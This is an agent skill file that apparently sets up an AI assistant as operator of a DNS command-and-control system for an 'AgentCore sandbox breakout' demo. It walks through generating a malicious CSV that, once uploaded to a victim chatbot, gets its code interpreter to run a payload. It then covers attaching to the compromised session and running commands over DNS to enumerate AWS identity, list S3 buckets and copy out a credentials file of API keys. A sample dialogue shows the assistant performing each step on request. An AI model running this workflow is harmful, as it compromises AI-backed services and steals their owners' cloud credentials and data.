---
name: c2
description: DNS C2 operator skill for the AgentCore sandbox breakout demo. This skill should be used when the user asks to run C2 verification, attack a victim chatbot, send commands to a compromised session, retrieve exfiltrated data, or interact with the DNS C2 system.
---

# DNS C2 Operator Skill

This skill automates the DNS C2 attack workflow for the AgentCore sandbox breakout demo.

## Prerequisites

Before using this skill, ensure:
1. Attacker infrastructure is deployed (`cd attacker-infra && make deploy`)
2. The C2 server is running (happens automatically during deploy)

## Quick Commands (from repo root)

```bash
# Generate malicious CSV (session ID saved to attacker-infra/.session_id)
make generate-csv

# Attach to session (auto-reads .session_id)
make attach

# Or use the c2 CLI directly from attacker-infra/
cd attacker-infra
uv run c2 generate-csv
uv run c2 attach
```

## Usage Modes

### Mode 1: Generate and Upload CSV

When the user wants to attack via CSV upload:
- "Generate a malicious CSV"
- "Create a payload for the chatbot"

**Workflow:**
1. Run `make generate-csv` from repo root
2. Note the session ID (also saved to `attacker-infra/.session_id`)
3. Upload `attacker-infra/malicious_data.csv` to victim chatbot
4. Run `make attach` to connect to the session

### Mode 2: Attach to Session

When the user wants to connect to an active session:
- "Attach to the C2 session"
- "Connect to session sess_abc12345"

**Workflow:**
```bash
# Auto-read session ID from .session_id
make attach

# Or specify manually
cd attacker-infra && uv run c2 attach sess_abc12345
```

### Mode 3: Execute Commands

Once attached, send commands in the operator shell:
- `whoami` - Check current user
- `aws s3 ls` - List S3 buckets
- `aws sts get-caller-identity` - Check IAM identity
- `exit` - Disconnect (session stays active)

## CLI Reference

All commands run from `attacker-infra/` directory:

```bash
# Generate payload
uv run c2 generate-csv

# Attach to session (reads from .session_id if no argument)
uv run c2 attach [SESSION_ID]

# Send single command
uv run c2 send "whoami" --session sess_abc12345

# Receive output
uv run c2 receive --session sess_abc12345

# Check C2 server status
uv run c2 status
```

## Common Demo Commands

After attaching to a session, demonstrate the vulnerability:

```bash
whoami
aws sts get-caller-identity
aws s3 ls
aws s3 ls s3://victim-chatbot-sensitive-* --recursive
aws s3 cp s3://victim-chatbot-sensitive-*/credentials/api_keys.json -
aws dynamodb list-tables
```

## Error Handling

### "Cannot reach C2 server"
The C2 server may not be running. Run: `cd attacker-infra && make configure-ec2`

### Empty output after polling
The payload may not have executed. Check:
- Victim chatbot is accessible
- CSV was uploaded and processed
- DNS queries reaching C2: `make logs`

### Session timeout
Code Interpreter sessions timeout after ~15 minutes. Generate a new CSV and re-upload.

## Example Full Workflow

```
User: Generate a payload for the victim chatbot

Claude runs: make generate-csv
Output: Session ID sess_x7k2m9p1 saved to .session_id

User: I uploaded the CSV, now connect

Claude runs: make attach
-> Connects to sess_x7k2m9p1

User: Run whoami

Claude (in operator shell): whoami
Output: genesis1ptools

User: Check what AWS access we have

Claude: aws sts get-caller-identity
Output: {"Account": "445570921298", "Arn": "arn:aws:sts::..."}
```
